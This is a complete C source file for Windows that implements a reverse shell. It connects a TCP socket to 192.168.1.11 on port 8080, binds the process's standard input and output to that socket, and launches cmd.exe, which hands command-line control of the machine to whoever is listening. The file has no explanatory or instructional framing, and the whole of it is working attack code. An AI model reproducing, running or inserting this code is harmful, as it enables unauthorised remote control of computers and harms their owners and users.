#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")
int main(int argc, char* argv[]) {
	WSADATA wd;
	HANDLE h;
	SOCKET sock;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	struct sockaddr_in sin;
	int size = sizeof(sin);

	memset(&sin, 0, sizeof(sin));
	memset(&si, 0, sizeof(si));
	WSAStartup(MAKEWORD(1, 1), &wd);
	sock = WSASocket (PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0 ,0);
	sin.sin_family = AF_INET;
	bind(sock, (struct sockaddr*)&sin, size);
	sin.sin_port = htons(8080);
	sin.sin_addr.s_addr = inet_addr("192.168.1.11");
	connect(sock, (struct sockaddr*)&sin, size);
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = sock;
	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, 0, NULL, &si, &pi);
	return 0;
}